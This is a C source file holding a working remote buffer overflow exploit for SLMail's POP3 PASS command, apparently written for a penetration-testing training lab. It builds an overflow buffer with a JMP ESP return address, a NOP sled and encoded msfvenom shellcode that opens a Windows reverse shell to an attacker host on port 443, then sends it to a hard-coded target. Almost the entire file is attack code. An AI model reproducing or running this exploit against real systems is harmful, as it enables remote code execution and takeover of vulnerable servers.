#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
 
#include <arpa/inet.h> //fix inet
#include <unistd.h> //fix read, write ,close

#define retadd "\x8f\x35\x4a\x5f" //JMP ESP in SLMFC.dll Immunity Debugger //Win 7 PWK
#define port 110

//msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.114 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
unsigned char shellcode[] =
"\xbd\x7d\xa8\xde\x23\xdb\xd8\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x52\x83\xe8\xfc\x31\x68\x0e\x03\x15\xa6\x3c\xd6\x19\x5e\x42"
"\x19\xe1\x9f\x23\x93\x04\xae\x63\xc7\x4d\x81\x53\x83\x03\x2e"
"\x1f\xc1\xb7\xa5\x6d\xce\xb8\x0e\xdb\x28\xf7\x8f\x70\x08\x96"
"\x13\x8b\x5d\x78\x2d\x44\x90\x79\x6a\xb9\x59\x2b\x23\xb5\xcc"
"\xdb\x40\x83\xcc\x50\x1a\x05\x55\x85\xeb\x24\x74\x18\x67\x7f"
"\x56\x9b\xa4\x0b\xdf\x83\xa9\x36\xa9\x38\x19\xcc\x28\xe8\x53"
"\x2d\x86\xd5\x5b\xdc\xd6\x12\x5b\x3f\xad\x6a\x9f\xc2\xb6\xa9"
"\xdd\x18\x32\x29\x45\xea\xe4\x95\x77\x3f\x72\x5e\x7b\xf4\xf0"
"\x38\x98\x0b\xd4\x33\xa4\x80\xdb\x93\x2c\xd2\xff\x37\x74\x80"
"\x9e\x6e\xd0\x67\x9e\x70\xbb\xd8\x3a\xfb\x56\x0c\x37\xa6\x3e"
"\xe1\x7a\x58\xbf\x6d\x0c\x2b\x8d\x32\xa6\xa3\xbd\xbb\x60\x34"
"\xc1\x91\xd5\xaa\x3c\x1a\x26\xe3\xfa\x4e\x76\x9b\x2b\xef\x1d"
"\x5b\xd3\x3a\xb1\x0b\x7b\x95\x72\xfb\x3b\x45\x1b\x11\xb4\xba"
"\x3b\x1a\x1e\xd3\xd6\xe1\xc9\xd6\x2d\xe9\x7b\x8f\x33\xe9\x7a"
"\xf4\xbd\x0f\x16\x1a\xe8\x98\x8f\x83\xb1\x52\x31\x4b\x6c\x1f"
"\x71\xc7\x83\xe0\x3c\x20\xe9\xf2\xa9\xc0\xa4\xa8\x7c\xde\x12"
"\xc4\xe3\x4d\xf9\x14\x6d\x6e\x56\x43\x3a\x40\xaf\x01\xd6\xfb"
"\x19\x37\x2b\x9d\x62\xf3\xf0\x5e\x6c\xfa\x75\xda\x4a\xec\x43"
"\xe3\xd6\x58\x1c\xb2\x80\x36\xda\x6c\x63\xe0\xb4\xc3\x2d\x64"
"\x40\x28\xee\xf2\x4d\x65\x98\x1a\xff\xd0\xdd\x25\x30\xb5\xe9"
"\x5e\x2c\x25\x15\xb5\xf4\x45\xf4\x1f\x01\xee\xa1\xca\xa8\x73"
"\x52\x21\xee\x8d\xd1\xc3\x8f\x69\xc9\xa6\x8a\x36\x4d\x5b\xe7"
"\x27\x38\x5b\x54\x47\x69"
"\xf0\xa5\xd7\x6c\xf0\xef";
 
struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(2960);
    memset(buffer, 0x00, 2960);
    char *off = malloc(2606);
    memset(off, 0x00, 2606);
  //	memset(off, 0x41, 2605);
	memset(off, 0x41, 2606);
  // 	char *nop = malloc(13);
  //	memset(nop, 0x00, 13);
  //	memset(nop, 0x90, 12);
  
	char *nop = malloc(16); //right buffer size
	memset(nop, 0x00, 16);
	memset(nop, 0x90, 16);
    
	strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("10.11.23.135");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);  
}
